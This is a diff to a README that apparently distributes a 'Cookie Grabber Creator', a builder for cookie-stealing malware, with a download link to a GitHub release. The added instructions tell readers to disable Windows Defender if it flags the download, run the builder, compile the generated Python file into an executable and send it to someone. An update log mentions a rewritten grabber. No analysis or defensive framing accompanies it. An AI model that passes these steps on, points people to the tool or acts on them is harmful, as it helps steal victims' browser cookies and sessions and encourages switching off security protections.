@@ -1,4 +1,10 @@
 ## [Download Here](https://github.com/H4cking-Esentials/Cookie-Grabber-Creator/releases/tag/release-v5-1.0.0)
+### Instructions:
+- Download the zip (it shouldn't get flagged by defender but if it does just disable it; it's because of the injection.dll that I created most likely)
+- Unzip it and run the app
+- Enter your information and then just press create
+- After it creates you can just compile the python file into an exe and just send it to someone
+
 # Update Logs (Just Updated!)
 [08/08/2024]
 - Rewrote the grabber to use a faster runtime
